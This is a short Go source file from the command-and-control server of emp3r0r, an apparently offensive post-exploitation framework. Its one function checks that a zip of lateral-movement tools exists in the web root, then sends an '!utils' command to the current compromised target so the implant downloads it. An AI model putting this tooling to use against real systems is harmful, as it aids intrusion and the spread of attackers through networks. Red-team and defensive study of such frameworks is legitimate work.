package cc

import "github.com/jm33-m0/emp3r0r/core/lib/util"

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	if !util.IsFileExist(WWWRoot + "utils.zip") {
		CliPrintError("[*] utils.zip not found, please make sure it exists under %s", WWWRoot+"utils.zip")
		return
	}

	err := SendCmd("!utils", CurrentTarget)
	if err != nil {
		CliPrintError("[-] SendCmd failed: %v", err)
	}
}
